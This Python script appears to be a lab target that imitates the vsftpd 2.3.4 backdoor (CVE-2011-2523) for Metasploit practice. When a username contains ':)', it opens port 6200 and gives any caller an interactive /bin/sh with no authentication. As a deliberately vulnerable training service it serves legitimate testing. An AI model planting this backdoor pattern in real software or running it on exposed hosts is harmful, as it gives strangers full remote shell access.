"""
vsftpd 2.3.4 Backdoor Simulation
----------------------------------
Simulates the vsftpd 2.3.4 backdoor (CVE-2011-2523).
MSF module: exploit/unix/ftp/vsftpd_234_backdoor

Behavior:
  - Listens on port 21, presents a vsftpd 2.3.4 banner
  - When a USER command contains ':)' in the username,
    spawns a root shell listener on port 6200
  - The MSF module connects to port 6200 and gets a shell
"""

import socket
import threading
import subprocess
import time
import sys

BACKDOOR_PORT = 6200
FTP_PORT = 21
backdoor_active = False
backdoor_lock = threading.Lock()


def spawn_backdoor():
    global backdoor_active
    time.sleep(0.3)
    try:
        srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        srv.bind(("0.0.0.0", BACKDOOR_PORT))
        srv.listen(1)
        srv.settimeout(30)
        print(f"[vsftpd] Backdoor triggered — shell listening on :{BACKDOOR_PORT}", flush=True)
        conn, addr = srv.accept()
        print(f"[vsftpd] Backdoor connection from {addr}", flush=True)
        proc = subprocess.Popen(
            ["/bin/sh", "-i"],
            stdin=conn.fileno(),
            stdout=conn.fileno(),
            stderr=conn.fileno(),
        )
        proc.wait()
        conn.close()
        srv.close()
    except Exception as e:
        print(f"[vsftpd] Backdoor error: {e}", flush=True)
    finally:
        with backdoor_lock:
            backdoor_active = False


def handle_client(conn, addr):
    global backdoor_active
    try:
        conn.send(b"220 (vsFTPd 2.3.4)\r\n")
        while True:
            data = conn.recv(1024)
            if not data:
                break
            line = data.decode(errors="ignore").strip()

            if line.upper().startswith("USER "):
                username = line[5:]
                if ":)" in username:
                    with backdoor_lock:
                        if not backdoor_active:
                            backdoor_active = True
                            threading.Thread(target=spawn_backdoor, daemon=True).start()
                conn.send(b"331 Please specify the password.\r\n")

            elif line.upper().startswith("PASS "):
                conn.send(b"530 Login incorrect.\r\n")

            elif line.upper().startswith("QUIT"):
                conn.send(b"221 Goodbye.\r\n")
                break

            else:
                conn.send(b"530 Please login with USER and PASS.\r\n")
    except Exception:
        pass
    finally:
        conn.close()


def main():
    srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    srv.bind(("0.0.0.0", FTP_PORT))
    srv.listen(10)
    print(f"[vsftpd] FTP service listening on :{FTP_PORT}", flush=True)
    while True:
        conn, addr = srv.accept()
        threading.Thread(target=handle_client, args=(conn, addr), daemon=True).start()


if __name__ == "__main__":
    main()
